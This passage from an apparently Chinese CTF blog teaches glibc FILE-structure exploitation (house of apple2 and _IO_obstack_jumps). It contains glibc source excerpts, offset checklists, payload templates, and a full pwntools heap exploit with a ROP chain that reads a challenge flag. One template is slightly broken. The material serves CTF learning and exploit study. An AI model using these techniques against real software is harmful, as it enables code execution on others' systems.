<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">wint_t</span><br>_IO_wfile_overflow (FILE *f, <span class="hljs-keyword">wint_t</span> wch)<br>&#123;<br>  <span class="hljs-keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="hljs-comment">/* SET ERROR */</span><br>    &#123;<br>      f-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> WEOF;<br>    &#125;<br>  <span class="hljs-comment">/* If currently reading or no buffer allocated. */</span><br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Allocate a buffer if needed. */</span><br>      <span class="hljs-keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="hljs-number">0</span>) <span class="hljs-comment">// 需为0</span><br>    &#123;<br>      _IO_wdoallocbuf (f); <span class="hljs-comment">// 函数指针调用</span><br>      <span class="hljs-comment">// ......</span><br>    &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>再看看 _IO_wdoallocbuf 的源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span><br>_IO_wdoallocbuf (FILE *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)  <span class="hljs-comment">// 需为0</span><br>    <span class="hljs-keyword">return</span>;<br>  <span class="hljs-keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)<span class="hljs-comment">// 最终函数指针调用 _IO_WDOALLOCATE</span><br>      <span class="hljs-keyword">return</span>;<br>  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,<br>             fp-&gt;_wide_data-&gt;_shortbuf + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br>libc_hidden_def (_IO_wdoallocbuf)<br></code></pre></td></tr></table></figure>

<p>因此，如果我们可以劫持<code>IO_FILE</code>的<code>vtable</code>为<code>_IO_wfile_jumps</code>，控制<code>_wide_data</code>为可控的堆地址空间，进而控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间。控制程序执行<code>IO</code>流函数调用，最终调用到<code>_IO_WDOALLOCATE</code>函数即可控制程序的执行流。</p>
<p>伪造 Fake_IO :</p>
<ul>
<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，<strong>注意填写的内容前面必须要有两个空格</strong>。</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址，需加减偏移使其能成功调用<code>_IO_wfile_overflow</code>即可。（__malloc_assert 时需减去 0x20，FSOP 无需变动，因为偏移一致）</li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<p>对应模板为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">_IO_wfile_jumps = leak + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>fake_IO_FILE = <span class="hljs-number">2</span> * p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_write_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">0xffffffffffffffff</span>)  <span class="hljs-comment"># _IO_write_ptr</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_end</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_base)  <span class="hljs-comment"># _lock = writable address</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(A_addr)  <span class="hljs-comment"># _wide_data</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xB0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _mode = 0</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(_IO_wfile_jumps)  <span class="hljs-comment"># vtable</span><br><br><span class="hljs-comment">#Fake_IO  heap A </span><br>fake_A = <span class="hljs-string">b&#x27;&#x27;</span>.ljust(<span class="hljs-number">0xd0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_A += p64(B_addr)  <span class="hljs-comment"># heap B Address</span><br><br><span class="hljs-comment"># Fake_IO  heap B</span><br>fake_B = <span class="hljs-string">b&#x27;&#x27;</span>.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_B += p64(gadget)  <span class="hljs-comment">#call func</span><br></code></pre></td></tr></table></figure>

<h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><p>漏洞点位于释放功能，没有清空指针，但是程序较为苛刻，只允许打印一次和写入一次，所以堆风水很重要。。。</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20230209211634732.png"><span class="image-caption">image-20230209211634732</span></p>
<p>然后，house of apple2 的 rdi 值控制其实有些问题的，想要 orw，gadget 需要比较苛刻，用到了一个比较少见的gadget，通过劫持 rbp 以及布置 leave ；ret 完成栈迁移。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">mov rbp, qword ptr [rdi + 0x48]; <br>mov rax, qword ptr [rbp + 0x18]; <br>lea r13, [rbp + 0x10]; <br>mov dword ptr [rbp + 0x10], 0; <br>mov rdi, r13; <br>call qword ptr [rax + 0x28];<br></code></pre></td></tr></table></figure>

<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20230209211622714.png"><span class="image-caption">image-20230209211622714</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>binary = <span class="hljs-string">&#x27;./oneday&#x27;</span><br>elf = ELF(binary)<br>DEBUG = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    p = process(binary)<br>    libc = elf.libc<br>    <br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;127&#x27;</span><br>    port = <span class="hljs-number">30007</span><br>    libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>    p = remote(ip, port)<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">info=<span class="hljs-string">&quot;b main&quot;</span></span>):</span><br>	gdb.attach(p, info)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choose</span>(<span class="hljs-params">choice</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;enter your command: \n&quot;</span>, <span class="hljs-built_in">str</span>(choice).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx</span>):</span><br>    choose(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;choise: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>	<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx, content</span>):</span><br>    choose(<span class="hljs-number">3</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&#x27;Message: \n&#x27;</span>)<br>    p.send(content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    choose(<span class="hljs-number">4</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    choose(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index: \n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br>p.sendlineafter(<span class="hljs-string">&quot;enter your key &gt;&gt;\n&quot;</span>, <span class="hljs-string">b&#x27;10&#x27;</span>)<br>add(<span class="hljs-number">2</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">2</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">1</span>) <span class="hljs-comment"># 2</span><br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">1</span>) <span class="hljs-comment"># 3 </span><br>add(<span class="hljs-number">1</span>) <span class="hljs-comment"># 4</span><br>add(<span class="hljs-number">1</span>) <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">1</span>) <span class="hljs-comment"># 6</span><br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">5</span>)<br>show(<span class="hljs-number">3</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1f2cc0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %leak)<br>p.recv(<span class="hljs-number">2</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x17f0</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br><br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">3</span>) <span class="hljs-comment"># 7</span><br>add(<span class="hljs-number">1</span>) <span class="hljs-comment"># 8</span><br>add(<span class="hljs-number">1</span>) <span class="hljs-comment"># 9</span><br>free(<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">3</span>) <span class="hljs-comment"># 10</span><br><br>_IO_list_all = leak + <span class="hljs-number">0x1f3660</span><br>chunk_addr = heap_base + <span class="hljs-number">0x1810</span><br>_IO_wfile_jumps = leak + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xa81</span>)<br>fake_IO_FILE += <span class="hljs-number">2</span> * p64(<span class="hljs-number">0</span>) <br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_write_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">0xffffffffffffffff</span>)  <span class="hljs-comment"># _IO_write_ptr</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_end</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(chunk_addr + <span class="hljs-number">0x238</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_base)  <span class="hljs-comment"># _lock = writable address</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(chunk_addr + <span class="hljs-number">0xe0</span>)  <span class="hljs-comment"># _wide_data</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _mode = 0</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(_IO_wfile_jumps)  <span class="hljs-comment"># vtable</span><br><br>gadget = leak + <span class="hljs-number">0x1482ba</span> <span class="hljs-comment"># mov    rbp,QWORD PTR [rdi+0x48]</span><br>setcontext = libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span><br><span class="hljs-built_in">open</span> = libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>] + leak<br>read = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] + leak <br>write = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>] + leak<br>leave_ret = leak + <span class="hljs-number">0x0000000000052d72</span><br>pop_rdi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>))) + leak<br>pop_rsi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>))) + leak<br>pop_rdx = leak + <span class="hljs-number">0x00000000001066e1</span> <span class="hljs-comment"># pop rdx ; pop r12 ; ret</span><br>flag_addr = chunk_addr + <span class="hljs-number">0x288</span><br>rop = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>rop += p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">open</span>)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span> +  p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span> + p64(write)<br><br>payload = p64(<span class="hljs-number">0</span>) + p64(_IO_list_all - <span class="hljs-number">0x20</span>)<br>payload += fake_IO_FILE<br>payload += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0xe0</span><br>payload += p64(chunk_addr + <span class="hljs-number">0x1c8</span>)<br>payload += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x68</span><br>payload += p64(gadget)<br>payload += p64(chunk_addr + <span class="hljs-number">0x288</span>)<br>payload += p64(leave_ret) + p64(<span class="hljs-number">0</span>)<br>payload += p64(chunk_addr + <span class="hljs-number">0x258</span>)<br>payload += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x28</span><br>payload += p64(leave_ret)<br>payload += rop<br>payload = payload.ljust(<span class="hljs-number">0xa90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xab1</span>) <br>edit(<span class="hljs-number">5</span>, payload)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">3</span>)<br><span class="hljs-comment"># debug(&#x27;b _IO_wdoallocbuf&#x27;)</span><br>choose(<span class="hljs-number">6</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="IO-obstack-jumps"><a href="#IO-obstack-jumps" class="headerlink" title="_IO_obstack_jumps"></a>_IO_obstack_jumps</h3><p>攻击前提：</p>
<ol>
<li>拥有堆地址和 libc 地址</li>
<li>一次任意地址写可控地址的机会</li>
<li>可以通过 FSOP 或 __malloc_assert 触发</li>
</ol>
<h4 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h4><p>存在个 _IO_obstack_file 结构体，是由 _IO_FILE_plus 扩展的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_obstack_file</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> <span class="hljs-title">file</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">obstack</span> *<span class="hljs-title">obstack</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>存在个 _IO_obstack_jumps 的 vtable，里面只要两个函数：_IO_obstack_overflow 和 _IO_obstack_xsputn。但是 _IO_obstack_overflow 无法利用，所以重点在于 _IO_obstack_xsputn。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* the jump table.  */</span><br><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_obstack_jumps</span> <span class="hljs-title">libio_vtable</span> <span class="hljs-title">attribute_hidden</span> =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, <span class="hljs-literal">NULL</span>),<br>  JUMP_INIT(overflow, _IO_obstack_overflow),<br>  JUMP_INIT(underflow, <span class="hljs-literal">NULL</span>),<br>  JUMP_INIT(uflow, <span class="hljs-literal">NULL</span>),<br>  JUMP_INIT(pbackfail, <span class="hljs-literal">NULL</span>),<br>  JUMP_INIT(xsputn, _IO_obstack_xsputn),<br>  JUMP_INIT(xsgetn, <span class="hljs-literal">NULL</span>),<br>  JUMP_INIT(seekoff, <span class="hljs-literal">NULL</span>),<br>  JUMP_INIT(seekpos, <span class="hljs-literal">NULL</span>),<br>  JUMP_INIT(setbuf, <span class="hljs-literal">NULL</span>),<br>  JUMP_INIT(sync, <span class="hljs-literal">NULL</span>),<br>  JUMP_INIT(doallocate, <span class="hljs-literal">NULL</span>),<br>  JUMP_INIT(read, <span class="hljs-literal">NULL</span>),<br>  JUMP_INIT(write, <span class="hljs-literal">NULL</span>),<br>  JUMP_INIT(seek, <span class="hljs-literal">NULL</span>),<br>  JUMP_INIT(close, <span class="hljs-literal">NULL</span>),<br>  JUMP_INIT(stat, <span class="hljs-literal">NULL</span>),<br>  JUMP_INIT(showmanyc, <span class="hljs-literal">NULL</span>),<br>  JUMP_INIT(imbue, <span class="hljs-literal">NULL</span>)<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>_IO_obstack_xsputn 的源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> _IO_size_t<br>_IO_obstack_xsputn (_IO_FILE *fp, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *data, _IO_size_t n)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">obstack</span> *<span class="hljs-title">obstack</span> =</span> ((struct _IO_obstack_file *) fp)-&gt;obstack;<br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)  <span class="hljs-comment">// 需要绕过</span><br>    &#123;<br>      <span class="hljs-keyword">int</span> size;<br>      <span class="hljs-comment">/* We need some more memory.  First shrink the buffer to the</span><br><span class="hljs-comment">     space we really currently need.  */</span><br>      obstack_blank_fast (obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);  <span class="hljs-comment">// 不造成影响</span><br><br>      <span class="hljs-comment">/* Now grow for N bytes, and put the data there.  */</span><br>      obstack_grow (obstack, data, n);  <span class="hljs-comment">// 其中存在函数指针调用</span><br><br>      [...]<br>&#125;<br></code></pre></td></tr></table></figure>

<p>obstack_grow 源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> obstack_grow(OBSTACK, where, length)                      \</span><br><span class="hljs-meta">  __extension__                                   \</span><br><span class="hljs-meta">    (&#123; struct obstack *__o = (OBSTACK);                       \</span><br><span class="hljs-meta">       int __len = (length);                              \</span><br><span class="hljs-meta">       <span class="hljs-meta-keyword">if</span> (_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)                  \</span><br><span class="hljs-meta">     _obstack_newchunk (__o, __len);                      \</span><br><span class="hljs-meta">       memcpy (__o-&gt;next_free, where, __len);                     \</span><br><span class="hljs-meta">       __o-&gt;next_free += __len;                           \</span><br><span class="hljs-meta">       (void) 0; &#125;)</span><br></code></pre></td></tr></table></figure>

<p>当满足 _o-&gt;next_free + __len &gt; __o-&gt;chunk_limit 会调用 _obstack_newchunk (__o, __len) ,其源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span><br>_obstack_newchunk (struct obstack *h, <span class="hljs-keyword">int</span> length)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">obstack_chunk</span> *<span class="hljs-title">old_chunk</span> =</span> h-&gt;chunk;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">obstack_chunk</span> *<span class="hljs-title">new_chunk</span>;</span><br>  <span class="hljs-keyword">long</span> new_size;<br>  <span class="hljs-keyword">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;<br>  <span class="hljs-keyword">long</span> i;<br>  <span class="hljs-keyword">long</span> already;<br>  <span class="hljs-keyword">char</span> *object_base;<br><br>  <span class="hljs-comment">/* Compute size for new chunk.  */</span><br>  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="hljs-number">3</span>) + h-&gt;alignment_mask + <span class="hljs-number">100</span>;<br>  <span class="hljs-keyword">if</span> (new_size &lt; h-&gt;chunk_size)<br>    new_size = h-&gt;chunk_size;<br><br>  <span class="hljs-comment">/* Allocate and initialize the new chunk.  */</span><br>  new_chunk = CALL_CHUNKFUN (h, new_size);<br>  [...]<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在执行到 CALL_CHUNKFUN 宏时：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> CALL_CHUNKFUN(h, size) \</span><br><span class="hljs-meta">  (((h)-&gt;use_extra_arg)                               \</span><br><span class="hljs-meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))                     \</span><br><span class="hljs-meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span><br></code></pre></td></tr></table></figure>

<p>如果 (h)-&gt;use_extra_arg 不为 0 ，会执行  (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))，这个地方就是我们要利用的点。</p>
<p>总结：</p>
<ul>
<li>伪造<code>_IO_FILE</code>，记完成伪造的<code>chunk</code>为<code>A</code></li>
<li><code>chunk A</code>内偏移为 0x18 处设为 1（<code>next_free</code>)</li>
<li><code>chunk A</code>内偏移为 0x20 处设为 0（<code>chunk_limit</code>）</li>
<li><code>chunk A</code>内偏移为 0x28 处设为 1（<code>_IO_write_ptr</code>）</li>
<li><code>chunk A</code>内偏移为 0x30 处设为 0（<code>_IO_write_end</code>）</li>
<li><code>chunk A</code>内偏移为 0x38 处设置函数调用</li>
<li><code>chunk A</code>内偏移为 0x48 处设置 RDI 的值</li>
<li><code>chunk A</code>内偏移为 0x50 处设为 1 （<code>use_extra_arg</code>）</li>
<li><code>chunk A</code>内偏移为 0xd8 处设为<code>_IO_obstack_jumps + 0x20</code> （__malloc_assert 时去掉 0x20 即可）</li>
<li><code>chunk A</code>内偏移为 0xe0 处设置<code>chunk A</code>的地址作为<code>obstack</code>结构体</li>
</ul>
<p>模板为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_IO_str_jumps</span>():</span><br>    IO_file_jumps_addr = libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>    IO_str_underflow_addr = libc.sym[<span class="hljs-string">&#x27;_IO_str_underflow&#x27;</span>]<br>    <span class="hljs-keyword">for</span> ref <span class="hljs-keyword">in</span> libc.search(p64(IO_str_underflow_addr - libc.address)):<br>        possible_IO_str_jumps_addr = ref - <span class="hljs-number">0x20</span><br>        <span class="hljs-keyword">if</span> possible_IO_str_jumps_addr &gt; IO_file_jumps_addr:<br>            <span class="hljs-keyword">return</span> possible_IO_str_jumps_addr<br><br><br>_IO_obstack_jumps = leak + get_IO_str_jumps - <span class="hljs-number">0x300</span><br>log.info(<span class="hljs-string">&quot;_IO_obstack_jumps==&gt;0x%x&quot;</span> %_IO_obstack_jumps)<br>fake_IO_FILE = p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)  <span class="hljs-comment"># next_free</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># chunk_limit</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _IO_write_ptr</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_write_end</span><br>fake_IO_FILE += p64(gadget)  <span class="hljs-comment"># call func</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64()  <span class="hljs-comment"># rdiValue</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)  <span class="hljs-comment"># use_extra_arg</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xB0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _mode = 0</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(_IO_obstack_jumps + <span class="hljs-number">0x20</span>)  <span class="hljs-comment"># vtable</span><br>fake_IO_FILE += p64(chunk_addr)<br></code></pre></td></tr></table></figure>

<h4 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h4><p>跟 house of apple 一样的题目。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>binary = <span class="hljs-string">&#x27;./oneday&#x27;</span><br>elf = ELF(binary)<br>DEBUG = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    p = process(binary)<br>    libc = elf.libc<br>    <br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;127&#x27;</span><br>    port = <span class="hljs-number">30007</span><br>    libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>    p = remote(ip, port)<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">info=<span class="hljs-string">&quot;b main&quot;</span></span>):</span><br>	gdb.attach(p, info)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choose</span>(<span class="hljs-params">choice</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;enter your command: \n&quot;</span>, <span class="hljs-built_in">str</span>(choice).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx</span>):</span><br>    choose(<span class="hljs-number">1</span>)<br>    